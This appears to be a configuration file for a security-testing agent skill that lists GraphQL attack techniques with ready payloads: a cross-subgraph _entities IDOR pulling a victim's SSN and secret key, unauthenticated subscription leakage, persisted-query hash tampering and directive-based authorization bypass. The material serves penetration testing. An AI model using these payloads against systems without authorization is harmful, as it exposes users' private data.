schema_version: 1
version: 3.0.0
name: graphql-advanced-attacks
description: >
  Advanced GraphQL architecture attacks covering Apollo Federation _entities cross-subgraph IDOR,
  GraphQL WebSocket subscriptions event leakage, Automatic Persisted Queries (APQ) hash tampering,
  and directive authorization bypasses.
triggers:
  - graphql federation
  - _entities
  - graphql subscription
  - graphql persisted query
  - apq
  - subgraph idor
  - apollo federation
tools:
  - curl
  - python3
knowledge: |
  Advanced GraphQL security testing evaluates distributed microservices architectures (Apollo Federation,
  subgraphs, gateway routers), real-time WebSocket subscriptions, and query acceleration caches (APQ).

  1. APOLLO FEDERATION & SUBGRAPH ROUTER EXPLOITATION:
     In Apollo Federation, a gateway stitches multiple internal subgraphs into a unified schema:
     a. Introspect Federation Directives & Types:
        Query the `_service` field to extract the underlying federated SDL (Schema Definition Language):
        `{"query": "query { _service { sdl } }"}`
        This discloses private internal subgraph schemas and entities that are hidden from public introspection!
     b. Cross-Subgraph IDOR via `_entities` Query:
        The `_entities` query resolves entity representations across subgraphs. Often, individual subgraphs
        assume the gateway validated authorization and fail to enforce tenant checks:
        `{"query": "query($rep: [_Any!]!) { _entities(representations: $rep) { ... on User { id email ssn secretKey } } }",`
        ` "variables": {"rep": [{"__typename": "User", "id": "VICTIM_UUID"}]}}`
        If private fields return for arbitrary UUIDs, subgraph-level authorization is missing.

  2. GRAPHQL WEBSOCKET SUBSCRIPTIONS & EVENT LEAKAGE:
     GraphQL subscriptions operate over WebSockets (protocols: `graphql-ws` or legacy `subscriptions-transport-ws`):
     - Connect to WebSocket endpoint (e.g. `wss://target.com/graphql`):
     - Connection Initialization:
       Send: `{"type": "connection_init", "payload": {}}`
       (Test omitting the Authorization token inside `payload` to check unauthenticated subscription access).
     - Subscribe to Global Event Streams:
       Send: `{"id": "1", "type": "subscribe", "payload": {"query": "subscription { userCreated { id email role } }"}}`
       `subscription { orderPlaced { id total creditCardLast4 } }`
     - Observe live server broadcasts across all tenants without authorization barriers.

  3. AUTOMATIC PERSISTED QUERIES (APQ) HASH TAMPERING:
     APQ accelerates requests by sending SHA-256 hashes instead of full query strings:
     - Step 1: Probe with known hash:
       `GET /graphql?extensions={"persistedQuery":{"version":1,"sha256Hash":"KNOWN_HASH"}}`
     - Step 2: Cache Poisoning / Tampering:
       If the server accepts hash registration:
       `POST /graphql` with `extensions={"persistedQuery":{"version":1,"sha256Hash":"COMPUTED_HASH"}}`
       and `query="query { sensitiveAdminField }"`
       Test if unauthenticated clients can execute restricted queries via pre-registered hashes.

  4. DIRECTIVE-BASED AUTHORIZATION BYPASS:
     Fuzz standard and custom directives: `@skip`, `@include`, `@auth`, `@cacheControl`:
     - Test manipulating conditional directives:
       `query { privateData @skip(if: false) { secret } }`
       `query { adminSection @include(if: true) { credentials } }`
     - Check if backend resolvers skip authorization checks when directives are appended.
references:
